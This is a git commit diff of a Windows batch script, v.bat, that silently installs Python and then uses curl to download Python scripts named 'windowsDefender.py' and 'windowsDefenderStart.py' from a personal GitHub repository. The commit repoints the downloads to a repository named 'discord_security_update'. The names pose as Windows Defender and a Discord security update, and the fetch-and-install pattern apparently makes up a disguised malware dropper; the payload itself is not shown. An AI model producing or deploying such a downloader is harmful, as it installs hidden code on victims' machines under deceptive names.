3a8e69adef2e9cda203ccfaec5360fcd8b0217bc
MundoCoRobiBundo <114348080+MundoCoRobiBundo@users.noreply.github.com>
2022-09-26 19:35:10 +0200

    Update v.bat

--- v.bat
+++ v.bat
@@ -2,9 +2,9 @@ curl https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe -O
 msiexec /a python-3.9.13.amd64.msi /qb TARGETDIR=C:\python39
 
 
-curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefender.py -O
-curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefenderStart.py -O
-curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefenderStart.py -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O
 
 pip install -r requirements.txt
 
